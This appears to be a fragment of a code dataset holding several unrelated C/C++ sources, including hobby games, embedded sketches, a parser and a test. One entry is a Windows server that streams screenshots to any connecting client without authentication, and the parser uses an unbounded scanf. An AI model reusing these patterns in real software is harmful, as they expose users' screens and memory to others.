std::endl;\n    return true;\n}\n\nvoid handleClient(SOCKET clientSocket) {\n    std::vector<BYTE> buffer;\n    BYTE data[4];\n\n    while (true) {\n        int bytesRead = recv(clientSocket, (char*)data, sizeof(data), 0);\n        if (bytesRead == 4 && memcmp(data, FOOTER, sizeof(FOOTER)) == 0) {\n            std::cout << \"Request received\" << std::endl;\n            if (captureScreenshot(buffer)) {\n                send(clientSocket, (char*)buffer.data(), (int)buffer.size(), 0);\n                std::cout << \"Frame sent\" << std::endl;\n            }\n        }\n        else {\n            std::cout << \"Received data: \" << bytesRead << \" bytes\" << std::endl;\n        }\n    }\n\n    std::cout << \"Client disconnected\" << std::endl;\n    closesocket(clientSocket);\n}\n\nint main() {\n    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);\n\n    WSADATA wsaData;\n    WSAStartup(MAKEWORD(2, 2), &wsaData);\n\n    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);\n    sockaddr_in serverAddr = { 0 };\n    serverAddr.sin_family = AF_INET;\n    serverAddr.sin_port = htons(PORT);\n    serverAddr.sin_addr.s_addr = INADDR_ANY;\n\n    bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));\n    listen(serverSocket, SOMAXCONN);\n\n    std::cout << \"Server running\" << std::endl;\n\n    while (true) {\n        SOCKET clientSocket = accept(serverSocket, nullptr, nullptr);\n        std::cout << \"Client connected\" << std::endl;\n        std::thread(handleClient, clientSocket).detach();\n    }\n\n    closesocket(serverSocket);\n    WSACleanup();\n    Gdiplus::GdiplusShutdown(gdiplusToken);\n    return 0;\n}\n",
    "#include <asio.hpp>\n#include <corio/detail/serial_runner.hpp>\n#include <doctest/doctest.h>\n\nTEST_CASE(\"test serial runner\") {\n\n    SUBCASE(\"accept io context\") {\n        asio::io_context io_context;\n        auto ex = io_context.get_executor();\n        corio::detail::SerialRunner runner(ex);\n        CHECK(runner.get_executor() == ex);\n        CHECK(runner.get_inner_executor() == ex);\n\n        auto runner2 = runner.fork_runner();\n        CHECK(runner2.get_executor() == ex);\n        CHECK(runner2.get_inner_executor() == ex);\n    }\n\n    SUBCASE(\"accept strand\") {\n        asio::io_context io_context;\n        auto strand = asio::make_strand(io_context.get_executor());\n        corio::detail::SerialRunner runner(strand);\n        CHECK(runner.get_executor() == strand);\n        CHECK(runner.get_inner_executor() == strand.get_inner_executor());\n\n        auto runner2 = runner.fork_runner();\n        CHECK(runner2.get_executor() != strand); // Another strand after fork\n        CHECK(runner2.get_inner_executor() == runner.get_inner_executor());\n    }\n\n    SUBCASE(\"default constructor and assign\") {\n        corio::detail::SerialRunner runner;\n        CHECK(!runner);\n\n        asio::io_context io_context;\n        auto ex = io_context.get_executor();\n        runner = corio::detail::SerialRunner(ex);\n\n        CHECK(runner.get_executor() == ex);\n        CHECK(runner.get_inner_executor() == ex);\n\n        runner = corio::detail::SerialRunner();\n        CHECK(!runner);\n\n        auto strand = asio::make_strand(ex);\n        runner = corio::detail::SerialRunner(strand);\n        CHECK(runner.get_executor() == strand);\n        CHECK(runner.get_inner_executor() == strand.get_inner_executor());\n    }\n}",
    "// src/GenZLib.cpp\n\n#include \"gen_z_lib/GenZLib.hpp\"\n#include <vector>\n#include <random>\n#include <ctime>\n#include <unordered_map>\n#include <algorithm>\n#include <sstream>\n#include <iostream> // Add this line for log_entry definition\n\nnamespace GenZLib {\n\n    GenZ::GenZ() {\n        // Constructor implementation (if needed)\n    }\n\n    GenZ::~GenZ() {\n        // Destructor implementation (if needed)\n    }\n\n    std::string GenZ::reverseString(const std::string& input) {\n        return std::string(input.rbegin(), input.rend());\n    }\n\n    void GenZ::rizz_print(const std::string& message) {\n        // Using printf to print the message\n        printf(\"%s\\n\", message.c_str());\n    }\n\n    std::string GenZ::getGenZSlang() {\n        // Predefined list of Gen Z slang words\n        static const std::vector<std::string> slangWords = {\n            \"No cap\",          // No lie/truth\n            \"Bet\",             // Yes/OK\n            \"Flex\",            // Show off\n            \"Lit\",             // Exciting/fun\n            \"Stan\",            // Overzealous fan\n            \"Ghosting\",        // Suddenly stopping communication\n            \"Salty\",           // Bitter/angry\n            \"Slaps\",           // Really good (music, etc.)\n            \"Tea\",             // Gossip\n            \"Shade\",           // Disrespect\n            \"Savage\",          // Ruthlessly honest\n            \"Ship\",            // Support a relationship\n            \"Snatched\",        // Perfect appearance\n            \"Vibe Check\",      // Assess the mood\n            \"Woke\",            // Socially aware\n            \"Yeet\",            // Throw or express excitement\n            \"Fam\",             // Friends/family\n            \"Clout\",           // Influence/popularity\n            \"Drip\",            // Stylish appearance\n            \"Cap\",             // Lie\n        };\n\n        // Initialize random number generator\n        static std::mt19937 rng(static_cast<unsigned int>(std::time(nullptr)));\n        std::uniform_int_distribution<std::size_t> dist(0, slangWords.size() - 1);\n\n        // Select and return a random slang word\n        return slangWords[dist(rng)];\n\n        \n    }\n\n    void GenZ::sheeshLog(const std::string& message) {\n        // Prefix the message with \"Sheesh!\" and print using printf\n        std::cout << \"Sheeeesh! \" << message << std::endl; \n    }\n\n    std::string getRandomEmoji() {\n        std::vector<std::string> emojiBank = {\n            \"\ud83d\udc85\", \"\u2728\", \"\ud83d\udd25\", \"\ud83d\udc80\", \"\ud83d\ude4c\", \"\ud83d\ude24\", \"\ud83e\udee1\", \"\ud83d\udcaf\", \"\ud83d\ude0e\", \"\ud83e\udd29\"\n        };\n        int randomIndex = rand() % emojiBank.size();\n        return emojiBank[randomIndex];\n    }\n\n    std::string convtZspeak(const std::string &input){\n        std::unordered_map<std::string, std::string> genzDictionary = {\n            {\"hello\", \"yo\"},\n            {\"hi\", \"hey\"},\n            {\"cool\", \"skibidi\"},\n            {\"amazing\", \"fire\"},\n            {\"good\", \"goated\"},\n            {\"bad\", \"mid\"},\n            {\"yes\", \"bet\"},\n            {\"no\", \"nah\"},\n            {\"friend\", \"bestie\"},\n            {\"angry\", \"pressed\"},\n            {\"excited\", \"hyped\"},\n            {\"great\", \"sigma\"},\n            {\"tired\", \"done\"},\n            {\"party\", \"vibe\"},\n            {\"work\", \"grind\"},\n            {\"money\", \"bag\"}};\n\n        std::string lowerInput = input;\n        std::transform(lowerInput.begin(), lowerInput.end(), lowerInput.begin(), ::tolower);\n\n        std::stringstream ss(lowerInput);\n        std::string word, zString;\n        while (ss >> word)\n        {\n            if (genzDictionary.find(word) != genzDictionary.end())\n            {\n                zString += genzDictionary[word] + \" \";\n            }\n            else\n            {\n                zString += word + \" \";\n            }\n        }\n\n        if (!zString.empty())\n        {\n            zString.pop_back();\n        }\n\n        zString += \" \" + getRandomEmoji();\n\n        return zString;\n    }\n\n} // namespace GenZLib\n",
    "#include <stdio.h>\r\n#include <string.h>\r\n#include <stdlib.h>\r\n\r\n#define MAX 100\r\n\r\n// Stack and input buffer\r\nchar stack[MAX];\r\nint top = -1;\r\nchar input[MAX];\r\nint inputIndex = 0;\r\n\r\n// Function to push an element to the stack\r\nvoid push(char symbol) {\r\n    if (top < MAX - 1) {\r\n        stack[++top] = symbol;\r\n    } else {\r\n        printf(\"Stack overflow!\\n\");\r\n        exit(1);\r\n    }\r\n}\r\n\r\n// Function to pop an element from the stack\r\nchar pop() {\r\n    if (top == -1) {\r\n        printf(\"Stack underflow!\\n\");\r\n        exit(1);\r\n    } else {\r\n        return stack[top--];\r\n    }\r\n}\r\n\r\n// Function to check if the stack matches the production S -> aSb\r\nint checkReduce() {\r\n    if (top >= 2 && stack[top] == 'b' && stack[top - 1] == 'S' && stack[top - 2] == 'a') {\r\n        return 1;\r\n    }\r\n    return 0;\r\n}\r\n\r\n// Function to perform the Shift-Reduce parsing\r\nvoid shiftReduceParse() {\r\n    while (inputIndex < strlen(input)) {\r\n        // Shift step: push the current input symbol to the stack\r\n        printf(\"Shift: %c\\n\", input[inputIndex]);\r\n        push(input[inputIndex]);\r\n        inputIndex++;\r\n\r\n        // Check if we can reduce (S -> aSb)\r\n        while (checkReduce()) {\r\n            // Pop 'b', 'S', 'a' and push 'S' to represent the reduction\r\n            pop(); // pop 'b'\r\n            pop(); // pop 'S'\r\n            pop(); // pop 'a'\r\n            push('S'); // push 'S' (reduction S -> aSb)\r\n            printf(\"Reduce: S -> aSb\\n\");\r\n        }\r\n\r\n        // Print the current stack\r\n        printf(\"Stack: \");\r\n        for (int i = 0; i <= top; i++) {\r\n            printf(\"%c \", stack[i]);\r\n        }\r\n        printf(\"\\n\");\r\n    }\r\n\r\n    // Final reduction check for S -> e (empty string)\r\n    if (top == 0 && stack[top] == 'S') {\r\n        printf(\"Input string is accepted by the parser.\\n\");\r\n    } else {\r\n        printf(\"Error: Invalid input string.\\n\");\r\n    }\r\n}\r\n\r\nint main() {\r\n    printf(\"Enter the input string (only 'a' and 'b' are allowed): \");\r\n    scanf(\"%s\", input);\r\n\r\n    // Parse the input string using shift-reduce parsing\r\n    shiftReduceParse();\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"cube.h\"\n#include <cstdlib>  // for rand()\n#include <vector>\n\n// We assume a texture atlas that is 16x16 tiles.\nconst float tileSize = 1.0f / 16.0f;\n\n// Define tile coordinates (in grid units) for each block texture.\n// (Coordinates are given as (tileX, tileY) with (0,0) at bottom-left.)\n  \n// Grass block:\nconst float grassTopTileX    = 0.0f, grassTopTileY    = 15.0f;\nconst float grassSideTileX   = 1.0f, grassSideTileY   = 15.0f;\nconst float grassBottomTileX = 2.0f, grassBottomTileY = 15.0f;\n\n// Dirt block (two variants):\nconst float dirtTile1X = 0.0f, dirtTile1Y = 14.0f;\nconst float dirtTile2X = 1.0f, dirtTile2Y = 14.0f;\n\n// Stone block:\nconst float stoneTileX = 2.0f, stoneTileY = 14.0f;\n\n// Sand block:\nconst float sandTileX = 3.0f, sandTileY = 14.0f;\n\n// Tree log block:\nconst float treeLogTopTileX = 4.0f, treeLogTopTileY = 14.0f;\nconst float treeLogSideTileX = 5.0f, treeLogSideTileY = 14.0f;\n\n// Tree leaves block:\nconst float leavesTileX = 6.0f, leavesTileY = 14.0f;\n\n// Helper function to compute UV coordinates for a given tile.\n// Returns UVs for the four corners: lower-left, lower-right, upper-right, upper-left.\nvoid getTileUV(float tileX, float tileY, float uv[4][2]) {\n    uv[0][0] = tileX * tileSize;         uv[0][1] = tileY * tileSize;\n    uv[1][0] = (tileX + 1) * tileSize;     uv[1][1] = tileY * tileSize;\n    uv[2][0] = (tileX + 1) * tileSize;     uv[2][1] = (tileY + 1) * tileSize;\n    uv[3][0] = tileX * tileSize;           uv[3][1] = (tileY + 1) * tileSize;\n}\n\n// addCube: Generates geometry for a cube at (x,y,z) using textures selected by blockType.\nvoid addCube(std::vector<float>& vertices, float x, float y, float z, BlockType blockType) {\n    float uvTop[4][2], uvSide[4][2], uvBottom[4][2];\n    \n    // Select the UV coordinates based on the block type.\n    if (blockType == BLOCK_GRASS) {\n        getTileUV(grassTopTileX, grassTopTileY, uvTop);\n        getTileUV(grassSideTileX, grassSideTileY, uvSide);\n        getTileUV(grassBottomTileX, grassBottomTileY, uvBottom);\n    } else if (blockType == BLOCK_DIRT) {\n        // Randomly choose one of two dirt variants.\n        int variant = rand() % 2;\n        if (variant == 0) {\n            getTileUV(dirtTile1X, dirtTile1Y, uvTop);\n            getTileUV(dirtTile1X, dirtTile1Y, uvSide);\n            getTileUV(dirtTile1X, dirtTile1Y, uvBottom);\n        } else {\n            getTileUV(dirtTile2X, dirtTile2Y, uvTop);\n            getTileUV(dirtTile2X, dirtTile2Y, uvSide);\n            getTileUV(dirtTile2X, dirtTile2Y, uvBottom);\n        }\n    } else if (blockType == BLOCK_STONE) {\n        getTileUV(stoneTileX, stoneTileY, uvTop);\n        getTileUV(stoneTileX, stoneTileY, uvSide);\n        getTileUV(stoneTileX, stoneTileY, uvBottom);\n    } else if (blockType == BLOCK_SAND) {\n        getTileUV(sandTileX, sandTileY, uvTop);\n        getTileUV(sandTileX, sandTileY, uvSide);\n        getTileUV(sandTileX, sandTileY, uvBottom);\n    } else if (blockType == BLOCK_TREE_LOG) {\n        // Tree logs: top and bottom use one tile; sides use another.\n        getTileUV(treeLogTopTileX, treeLogTopTileY, uvTop);\n        getTileUV(treeLogSideTileX, treeLogSideTileY, uvSide);\n        getTileUV(treeLogTopTileX, treeLogTopTileY, uvBottom);\n    } else if (blockType == BLOCK_LEAVES) {\n        // Leaves: use the same tile for all faces.\n        getTileUV(leavesTileX, leavesTileY, uvTop);\n        getTileUV(leavesTileX, leavesTileY, uvSide);\n        getTileUV(leavesTileX, leavesTileY, uvBottom);\n    }\n    \n    // Define the eight corners of the cube.\n    float x0 = x,     x1 = x + 1;\n    float y0 = y,     y1 = y + 1;\n    float z0 = z,     z1 = z + 1;\n    \n    // For brevity, we add faces in this order:\n    // Front, Back, Left, Right, Top, Bottom.\n    // Each face is two triangles (6 vertices) with 5 floats each.\n    \n    // Front face (z = z1) uses the side texture.\n    {\n        vertices.insert(vertices.end(), { x0, y0, z1, uvSide[0][0], uvSide[0][1] });\n        vertices.insert(vertices.end(), { x1, y0, z1, uvSide[1][0], uvSide[1][1] });\n        vertices.insert(vertices.end(), { x1, y1, z1, uvSide[2][0], uvSide[2][1] });\n        vertices.insert(vertices.end(), { x0, y0, z1, uvSide[0][0], uvSide[0][1] });\n        vertices.insert(vertices.end(), { x1, y1, z1, uvSide[2][0], uvSide[2][1] });\n        vertices.insert(vertices.end(), { x0, y1, z1, uvSide[3][0], uvSide[3][1] });\n    }\n    \n    // Back face (z = z0) uses the side texture.\n    {\n        vertices.insert(vertices.end(), { x1, y0, z0, uvSide[0][0], uvSide[0][1] });\n        vertices.insert(vertices.end(), { x0, y0, z0, uvSide[1][0], uvSide[1][1] });\n        vertices.insert(vertices.end(), { x0, y1, z0, uvSide[2][0], uvSide[2][1] });\n        vertices.insert(vertices.end(), { x1, y0, z0, uvSide[0][0], uvSide[0][1] });\n        vertices.insert(vertices.end(), { x0, y1, z0, uvSide[2][0], uvSide[2][1] });\n        vertices.insert(vertices.end(), { x1, y1, z0, uvSide[3][0], uvSide[3][1] });\n    }\n    \n    // Left face (x = x0) uses the sid",
    "#include \"MyStage.h\"\n\nMyStage::MyStage(AudioSensor *audioSensor, State *state) {\n\n    // physical strips\n\n    Strip *left = addStrip<STRIP_LEFT_COUNT, STRIP_LEFT_PIN, STRIP_LEFT_DENSITY>();\n    Strip *right = addStrip<STRIP_RIGHT_COUNT, STRIP_RIGHT_PIN, STRIP_RIGHT_DENSITY>();\n\n    // virtual strips\n\n    Strip *front = new JoinedStrip(new ReversedStrip(left), right, 2);\n    Strip *subLeft = new SubStrip(left, 15, 79);\n    Strip *subRight = new SubStrip(right, 15, 79);\n\n    Fx *frontBlackout = new Blackout(front);\n\n    CRGB blueBackgroundColor = CHSV(160, 255, 40);\n\n    FastLED.setMaxPowerInMilliWatts(1000 * MAX_WATTS);\n    FastLED.setCorrection(TypicalLEDStrip);\n\n    // Fx #1\n\n    addFx(\n        new Sunset(front, state)\n    );\n\n    // Fx #2\n\n    addFx(\n        new Volcane(left, audioSensor->left, state),\n        new Volcane(right, audioSensor->right, state)\n    );\n\n    // Fx #3\n\n    addFx(\n        new Jelly(left, audioSensor->left, state),\n        new Jelly(right, audioSensor->right, state)\n    );\n\n    // Fx #4\n\n    addFx(\n        new Chaser(left, audioSensor->left, state),\n        new Chaser(right, audioSensor->right, state)\n    );\n\n    // Fx #5\n\n    addFx(\n        new Glitter(front, state)\n    );\n\n    // Fx #6\n\n    addFx(\n        new VU1(left, audioSensor->left, state),\n        new VU1(right, audioSensor->right, state)\n    );\n\n    // Fx #7\n\n    addFx(\n        new Elastic(front, audioSensor->mono, state)\n    );\n\n    // Fx #8\n\n    addFx(\n        new Sinelon(front, state),\n        new VU2(left->overlay(), audioSensor->left, 5, 1000, CRGB::LimeGreen),\n        new VU2(right->overlay(), audioSensor->right, 5, 1000, CRGB::LimeGreen)\n    );\n\n    // Fx #9\n\n    addFx(\n        new SineMeter(left, audioSensor->left, state),\n        new SineMeter(right, audioSensor->right, state)\n    );\n\n    // Fx #10\n\n    addFx(\n        new Matrix(front, audioSensor->mono, state),\n        new PeakMeter(subLeft, audioSensor->left),\n        new PeakMeter(subRight, audioSensor->right)\n    );\n\n    // Fx #11\n\n    addFx(\n        new Ripple(front, audioSensor->mono, state, blueBackgroundColor),\n        new VU2(left->overlay(), audioSensor->left, 1, 1000, CRGB::Blue),\n        new VU2(right->overlay(), audioSensor->right, 1, 1000, CRGB::Blue)\n    );\n\n    // Fx #12\n\n    addFx(\n        new Strobe(left, audioSensor->left, state),\n        new Strobe(right, audioSensor->right, state)\n    );\n\n    // Fx #13\n\n    addFx(\n        new Ants(left, audioSensor->left, state),\n        new Ants(right, audioSensor->right, state)\n    );\n\n    // Fx #14\n\n    addFx(\n        new DeepSpace(front, audioSensor->mono, state, CRGB::DarkRed, CRGB::HotPink),\n        new Jelly(left->overlay(), audioSensor->left, state),\n        new Jelly(right->overlay(), audioSensor->right, state),\n        new VU2(left->overlay(), audioSensor->left, 1, 200, CRGB::LimeGreen),\n        new VU2(right->overlay(), audioSensor->right, 1, 200, CRGB::LimeGreen)\n    );\n\n    // Fx #15\n\n    addFx(\n        new Fire(left, audioSensor->left),\n        new Fire(right, audioSensor->right)\n    );\n\n    // Fx #16\n\n    addFx(\n        new Beat(left, audioSensor->left),\n        new Beat(right, audioSensor->right)\n    );\n\n    // Fx #17\n\n    addFx(\n        new Blackout(front),\n        new Blur(left->overlay()),\n        new Blur(right->overlay()),\n        new Ants(left->overlay(), audioSensor->left, state),\n        new Ants(right->overlay(), audioSensor->right, state)\n    );\n\n    // Fx #18\n\n    addFx(\n        new Blackout(front),\n        new Juggle(left->overlay(), state),\n        new Juggle(right->overlay(), state),\n        new Vertigo(left->overlay(), audioSensor->left, state),\n        new Vertigo(right->overlay(), audioSensor->right, state)\n    );\n\n    // Fx #19\n\n    addFx(\n        new Matrix(front, audioSensor->mono, state),\n        new Ants(front->overlay(), audioSensor->mono, state)\n    );\n\n    // Fx #20\n\n    addFx(\n        new Drops(left, audioSensor->left, state),\n        new Drops(right, audioSensor->right, state),\n        new Spiral(front->overlay(), state, 10, 2, .3)\n    );\n\n    // Fx #21\n\n    addFx(\n        new Blackout(left),\n        new Blackout(right),\n        new Scroller(left->overlay(), audioSensor->left, state),\n        new Scroller(right->overlay(), audioSensor->right, state),\n        new VU2(left->overlay(), audioSensor->left, 1, 1000, CRGB::White),\n        new VU2(right->overlay(), audioSensor->right, 1, 1000, CRGB::White)\n    );\n\n    // Fx #22\n\n    addFx(\n        new Fireworks(left, audioSensor->left, state),\n        new Fireworks(right, audioSensor->right, state)\n    );\n\n    // Fx #23\n\n    addFx(\n        new Vertigo(left, audioSensor->left, state),\n        new Vertigo(right, audioSensor->right, state)\n    );\n\n    // Fx #24\n\n    addFx(\n        new DeepSpace(front, audioSensor->mono, state, 0x800000, 0x000020)\n    );\n\n    // Fx #25\n\n    addFx(\n        new Matrix(front, audioSensor->mono, state),\n        new Fireworks(front->overlay(), audioSensor->mono, state),\n        new Drops(left->overlay(",
    "#include <Arduino.h>\n#include \"../include/serial-ble.h\"\n\n#define MAIN_T\t\"MAIN\"\n\n#define BLE_RESTART \"restart\"\n#define BLE_HELP    \"help\"\n#define BLE_LED     \"led\"\n\nbleRxHandler rxHandler;\nSerialBle ble(&rxHandler);\nbool oneShot = false;\n\nvoid ble_callback(const char *data, int data_size) {\n    String res;\n\tif(data_size < 96) {\n\t\tif(!strncmp(data, BLE_HELP, sizeof(BLE_HELP)-1)) {\n\t\t\tString info_str[9];\n\t\t\tinfo_str[0] = \"=========== COMMAND LIST ===========\";\n\t\t\tinfo_str[1] = \"'info' ------> Get device info\";\n\t\t\tinfo_str[2] = \"'pwd=xyz' ---> Set Wi-Fi password with string \\\"xyz\\\"\";\n\t\t\tinfo_str[3] = \"'reset' -----> Reset Wi-Fi SSID and password\";\n\t\t\tinfo_str[4] = \"'restart' ---> Reset device\";\n\t\t\tinfo_str[5] = \"'save' ------> Save Wi-Fi SSID and password\";\n\t\t\tinfo_str[6] = \"'scan' ------> Scan Wi-Fi networks\";\n\t\t\tinfo_str[7] = \"'set=n' -----> Set network 'n' of the scan list\";\n\t\t\tinfo_str[8] = \"'ssid=xyz' --> Set Wi-Fi SSID with string \\\"xyz\\\"\";\n\t\t\tfor(uint8_t i=0 ; i<9 ; i++) {\n\t\t\t\tinfo_str[i] += \"\\r\\n\";\n\t\t\t\tble.sendData((uint8_t *)info_str[i].c_str(), info_str[i].length());\n\t\t\t}\n\t\t}\n\t\telse if(!strncmp(data, BLE_RESTART, sizeof(BLE_RESTART)-1)) {\n\t\t\tres = \"OK >>> Restarting device, please reconnect after few seconds\\r\\n\";\n\t\t\tble.sendData((uint8_t *)res.c_str(), res.length());\n\t\t\tESP.restart();\n\t\t}\n\t\telse {\n\t\t\tconsole.warning(MAIN_T, \"Unknown string\");\n\t\t\tres = \"ERR >>> Invalid command\\r\\n\";\n\t\t\tble.sendData((uint8_t *)res.c_str(), res.length());\n\t\t}\n\t}\n\telse {\n\t\tconsole.error(MAIN_T, \"Buffer exceed length\");\n\t\tres = \"ERR >>> Message is too long\\r\\n\";\n\t\tble.sendData((uint8_t *)res.c_str(), res.length());\n\t}\n}\n\nvoid ble_callback2(const char *data, int data_size) {\n    String res;\n\tif(data_size < 96) {\n\t\tif(!strncmp(data, BLE_HELP, sizeof(BLE_HELP)-1)) {\n\t\t\tString info_str[9];\n\t\t\tinfo_str[0] = \"=========== COMMAND LIST ===========\";\n\t\t\tinfo_str[1] = \"'STOCAZZO\";\n\t\t\tinfo_str[2] = \"'pwd=xyz' ---> Set Wi-Fi password with string \\\"xyz\\\"\";\n\t\t\tinfo_str[3] = \"'reset' -----> Reset Wi-Fi SSID and password\";\n\t\t\tinfo_str[4] = \"'restart' ---> Reset device\";\n\t\t\tinfo_str[5] = \"'save' ------> Save Wi-Fi SSID and password\";\n\t\t\tinfo_str[6] = \"'scan' ------> Scan Wi-Fi networks\";\n\t\t\tinfo_str[7] = \"'set=n' -----> Set network 'n' of the scan list\";\n\t\t\tinfo_str[8] = \"'ssid=xyz' --> Set Wi-Fi SSID with string \\\"xyz\\\"\";\n\t\t\tfor(uint8_t i=0 ; i<9 ; i++) {\n\t\t\t\tinfo_str[i] += \"\\r\\n\";\n\t\t\t\tble.sendData((uint8_t *)info_str[i].c_str(), info_str[i].length());\n\t\t\t}\n\t\t}\n\t\telse if(!strncmp(data, BLE_RESTART, sizeof(BLE_RESTART)-1)) {\n\t\t\tres = \"OK >>> Restarting device, please reconnect after few seconds\\r\\n\";\n\t\t\tble.sendData((uint8_t *)res.c_str(), res.length());\n\t\t\tESP.restart();\n\t\t}\n\t\telse {\n\t\t\tconsole.warning(MAIN_T, \"Unknown string\");\n\t\t\tres = \"ERR >>> Invalid command\\r\\n\";\n\t\t\tble.sendData((uint8_t *)res.c_str(), res.length());\n\t\t}\n\t}\n\telse {\n\t\tconsole.error(MAIN_T, \"Buffer exceed length\");\n\t\tres = \"ERR >>> Message is too long\\r\\n\";\n\t\tble.sendData((uint8_t *)res.c_str(), res.length());\n\t}\n}\n\nvoid setup () {\n    rxHandler.setHandler(ble_callback);\n    ble.init(\"prova\");\n\n}\n\nvoid loop() {\n    delay(30000);\n    if (!oneShot){\n        oneShot = true;\n        rxHandler.setHandler(ble_callback2);\n    }\n}",
    "#include <Adafruit_ADXL375.h>\n#include <Adafruit_Sensor.h>\n#include <Wire.h>\n\nAdafruit_ADXL375 accel = Adafruit_ADXL375(12345);\nvoid displayDataRate(void)\n{\n  Serial.print  (\"Data Rate:    \");\n\n  switch(accel.getDataRate())\n  {\n    case ADXL343_DATARATE_3200_HZ:\n      Serial.print  (\"3200 \");\n      break;\n    case ADXL343_DATARATE_1600_HZ:\n      Serial.print  (\"1600 \");\n      break;\n    case ADXL343_DATARATE_800_HZ:\n      Serial.print  (\"800 \");\n      break;\n    case ADXL343_DATARATE_400_HZ:\n      Serial.print  (\"400 \");\n      break;\n    case ADXL343_DATARATE_200_HZ:\n      Serial.print  (\"200 \");\n      break;\n    case ADXL343_DATARATE_100_HZ:\n      Serial.print  (\"100 \");\n      break;\n    case ADXL343_DATARATE_50_HZ:\n      Serial.print  (\"50 \");\n      break;\n    case ADXL343_DATARATE_25_HZ:\n      Serial.print  (\"25 \");\n      break;\n    case ADXL343_DATARATE_12_5_HZ:\n      Serial.print  (\"12.5 \");\n      break;\n    case ADXL343_DATARATE_6_25HZ:\n      Serial.print  (\"6.25 \");\n      break;\n    case ADXL343_DATARATE_3_13_HZ:\n      Serial.print  (\"3.13 \");\n      break;\n    case ADXL343_DATARATE_1_56_HZ:\n      Serial.print  (\"1.56 \");\n      break;\n    case ADXL343_DATARATE_0_78_HZ:\n      Serial.print  (\"0.78 \");\n      break;\n    case ADXL343_DATARATE_0_39_HZ:\n      Serial.print  (\"0.39 \");\n      break;\n    case ADXL343_DATARATE_0_20_HZ:\n      Serial.print  (\"0.20 \");\n      break;\n    case ADXL343_DATARATE_0_10_HZ:\n      Serial.print  (\"0.10 \");\n      break;\n    default:\n      Serial.print  (\"???? \");\n      break;\n  }\n  Serial.println(\" Hz\");\n}\n\nvoid setup(void)\n{\n  Serial.begin(115200);\n  while (!Serial);\n  Serial.println(\"ADXL375 Accelerometer Test\"); Serial.println(\"\");\n\n  /* Initialise the sensor */\n  if(!accel.begin())\n  {\n    /* There was a problem detecting the ADXL375 ... check your connections */\n    Serial.println(\"Ooops, no ADXL375 detected ... Check your wiring!\");\n    while(1);\n  }\n\n  // Range is fixed at +-200g\n\n  /* Display some basic information on this sensor */\n  accel.printSensorDetails();\n  displayDataRate();\n  Serial.println(\"\");\n}\n\nvoid loop(void)\n{\n  /* Get a new sensor event */\n  sensors_event_t event;\n  accel.getEvent(&event);\n\n  /* Display the results (acceleration is measured in m/s^2) */\n\n  Serial.print(\"Z: \"); Serial.print(event.acceleration.z -15); Serial.print(\"  \");Serial.println(\"m/s^2 \");\n  \n}",
    "#include \"main.h\"\n\n// Global Variables\nstatic constexpr int FPS = 30;\nstatic constexpr int window_w = 800;\nstatic constexpr int window_h = 450;\nstatic auto window_title = \"CodingWithJamal - Tic Tac Toe\";\n\nenum GameState {\n    MENU,\n    PLAYING,\n    GAME_OVER\n};\n\n// Struct to store the game state\nstruct TicTacToeGame {\n    GameState currentState;\n    bool playerTurn; // true for Player X, false for Player O\n    char board[3][3]; // 3x3 grid for the board\n    char winner; // 'X' or 'O' or ' ' for no winner\n};\n\nvoid init_game(TicTacToeGame &game) {\n    game.currentState = MENU;\n    game.playerTurn = true;\n    game.winner = ' ';\n\n    // Initialize the board with empty spaces\n    for (auto & row : game.board) {\n        for (char & col : row) {\n            col = ' ';\n        }\n    }\n}\n\nvoid draw_menu() {\n    DrawText(\"Tic Tac Toe\", window_w / 2 - MeasureText(\"Tic Tac Toe\", 40) / 2, 100, 40, BLACK);\n    DrawText(\"Press ENTER to Start\", window_w / 2 - MeasureText(\"Press ENTER to Start\", 20) / 2, 200, 20, GRAY);\n}\n\n// Draw game board. 3x3\nvoid draw_board(const TicTacToeGame &game) {\n    constexpr int cell_width = window_w / 3;\n    constexpr int cell_height = window_h / 3;\n\n    // Draw grid lines\n    for (int i = 1; i < 3; i++) {\n        DrawLine(i * cell_width, 0, i * cell_width, window_h, BLACK);\n        DrawLine(0, i * cell_height, window_w, i * cell_height, BLACK);\n    }\n\n    // Draw symbols\n    for (int row = 0; row < 3; row++) {\n        for (int col = 0; col < 3; col++) {\n            const int x = col * cell_width + cell_width / 2;\n            const int y = row * cell_height + cell_height / 2;\n\n            if (game.board[row][col] == 'X') {\n                DrawText(\"X\", x - 20, y - 20, 40, RED);\n            } else if (game.board[row][col] == 'O') {\n                DrawText(\"O\", x - 20, y - 20, 40, BLUE);\n            }\n        }\n    }\n}\n\n// Check if a player has won the game\nbool check_winner(TicTacToeGame &game) {\n    // Check rows and columns\n    for (int i = 0; i < 3; i++) {\n        if (game.board[i][0] == game.board[i][1] && game.board[i][1] == game.board[i][2] && game.board[i][0] != ' ') {\n            game.winner = game.board[i][0];\n            return true;\n        }\n        if (game.board[0][i] == game.board[1][i] && game.board[1][i] == game.board[2][i] && game.board[0][i] != ' ') {\n            game.winner = game.board[0][i];\n            return true;\n        }\n    }\n\n    // Check diagonals\n    if (game.board[0][0] == game.board[1][1] && game.board[1][1] == game.board[2][2] && game.board[0][0] != ' ') {\n        game.winner = game.board[0][0];\n        return true;\n    }\n    if (game.board[0][2] == game.board[1][1] && game.board[1][1] == game.board[2][0] && game.board[0][2] != ' ') {\n        game.winner = game.board[0][2];\n        return true;\n    }\n\n    return false;\n}\n\nbool check_draw(const TicTacToeGame &game) {\n    for (const auto row : game.board) {\n        for (int col = 0; col < 3; col++) {\n            if (row[col] == ' ') {\n                return false; // Found an empty cell\n            }\n        }\n    }\n    return true; // No empty cells\n}\n\n// Handle user input when clicking on the board\nvoid handle_input(TicTacToeGame &game) {\n    if (IsMouseButtonPressed(MOUSE_BUTTON_LEFT)) {\n        constexpr int cell_width = window_w / 3;\n        constexpr int cell_height = window_h / 3;\n\n        Vector2 mouse = GetMousePosition();\n        const int col = mouse.x / cell_width;\n        const int row = mouse.y / cell_height;\n\n        if (row >= 0 && row < 3 && col >= 0 && col < 3 && game.board[row][col] == ' ') {\n            game.board[row][col] = game.playerTurn ? 'X' : 'O';\n            game.playerTurn = !game.playerTurn;\n\n            if (check_winner(game)) {\n                game.currentState = GAME_OVER;\n            } else if (check_draw(game)) {\n                game.currentState = GAME_OVER;\n                game.winner = ' '; // No winner\n            }\n        }\n    }\n}\n\nvoid draw_game_over(const TicTacToeGame &game) {\n    const char *message = (game.winner == ' ') ? \"It's a Draw!\" 